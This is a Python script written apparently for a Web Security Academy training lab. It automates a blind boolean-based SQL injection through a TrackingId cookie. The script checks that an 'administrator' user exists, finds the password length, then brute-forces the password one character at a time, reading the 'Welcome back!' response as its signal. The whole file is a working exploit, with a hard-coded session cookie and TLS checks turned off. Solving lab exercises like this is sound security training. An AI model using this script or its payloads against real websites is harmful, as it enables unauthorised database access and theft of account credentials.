import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

proxies = {
    "http": None, "https": None}

def set_cookies(sqli_payload):
    cookies = {'TrackingId': '0gp9Fup9LXKocG7y' + sqli_payload, 'session': 'NJDAhgUCFoUGuNTHXZoxva476D6rajDx'}
    return cookies

def check_administrator_user(url):
    isPresent = False
    sqli_payload = "'and (select username from users where username='administrator')='administrator'--"
    response = requests.get(url, cookies=set_cookies(sqli_payload), verify=False, proxies=proxies)  
    soup = BeautifulSoup(response.text, 'html.parser')
    if "Welcome back!" in soup.text:
        print("[+] Users table exists with username as 'administrator'")
        isPresent = True
    return isPresent

def fetch_administrator_password(url):
    password = ''
    if check_administrator_user(url):
        print("[+] Fetching administrator password character by character...")
        i = 1
        sqli_payload_base = "'and (select username from users where username='administrator' and LENGTH(password)>{})='administrator'--"
        response = requests.get(url, cookies=set_cookies(sqli_payload_base.format(i)), verify=False, proxies=proxies)  
        soup = BeautifulSoup(response.text, 'html.parser')
        while "Welcome back!" in soup.text:
            i += 1
            response = requests.get(url, cookies=set_cookies(sqli_payload_base.format(i)), verify=False, proxies=proxies)  
            soup = BeautifulSoup(response.text, 'html.parser')
        print(f"[+] Administrator password length is {i}")

        for j in range(1, i + 1):
            for k in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789':
                sqli_payload_char = "'and (select SUBSTRING(password,{},1) from users where username='administrator')='{}'--"
                response = requests.get(url, cookies=set_cookies(sqli_payload_char.format(j, k)), verify=False, proxies=proxies)  
                soup = BeautifulSoup(response.text, 'html.parser')
                if "Welcome back!" not in soup.text:
                    continue
                else:
                    password += k
                    print(f"[+] Found character {j}: {k}")
                    break

        print(f"[+] Administrator password is: {password}")
    else:
        print("[-] Administrator user not found.")


if __name__ == "__main__":
    try:
        # target_url = sys.argv[1]
        target_url = "https://0a53006403f2352f80870d5f00bf00fd.web-security-academy.net/"
    except IndexError:
        print("Usage: python3 sqli-lab-11.py <target_url>")
        print("Example: python3 sqli-lab-11.py https://example.com")
        sys.exit(1)
    print("[+] Fetching administrator password...")
    fetch_administrator_password(target_url)


